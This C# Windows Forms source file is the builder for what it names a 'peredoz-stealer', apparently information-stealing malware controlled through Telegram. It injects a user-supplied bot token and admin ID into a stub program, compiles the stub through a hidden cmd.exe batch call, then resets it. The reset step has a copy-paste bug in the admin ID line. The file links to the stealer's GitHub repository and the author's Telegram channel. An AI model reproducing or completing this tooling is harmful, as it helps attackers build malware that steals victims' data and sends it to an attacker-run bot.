using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace peredoz_builder
{
    public partial class builder : Form
    {
        public builder()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string botToken = textBox1.Text;
            string adminId = textBox2.Text;

            string stubFilePath = Path.Combine("stub", "Program.cs");

            string stubContent = File.ReadAllText(stubFilePath);

            stubContent = stubContent.Replace("private static readonly string BotToken = \"token\";",
                                              $"private static readonly string BotToken = \"{botToken}\";");
            stubContent = stubContent.Replace("private static readonly string AdminId = \"id\";",
                                              $"private static readonly string AdminId = \"{adminId}\";");

            File.WriteAllText(stubFilePath, stubContent);

            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = $"/c config.bat"; // Указываем путь к вашему bat-файлу
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;

            // Запускаем процесс
            process.Start();

            // Читаем вывод процесса
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();

            // Ждём завершения процесса
            process.WaitForExit();

            string stubToReset = Path.Combine("stub", "Program.cs");

            string stubToResetContent = File.ReadAllText(stubFilePath);

            stubToResetContent = stubToResetContent.Replace($"private static readonly string BotToken = \"{botToken}\";",
                                              "private static readonly string BotToken = \"token\";");

            stubToResetContent = stubToResetContent.Replace($"private static readonly string BotToken = \"{adminId}\";",
                                              "private static readonly string BotToken = \"id\";");

            File.WriteAllText(stubToReset, stubToResetContent);

            MessageBox.Show("Done!");
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void builder_Load(object sender, EventArgs e)
        {

        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://t.me/botfather");
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://t.me/getmyid_bot");
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void linkLabel3_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://t.me/kryyaasoft");
        }

        private void linkLabel4_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/kryyyaaaa/peredoz-stealer");
        }
    }
}
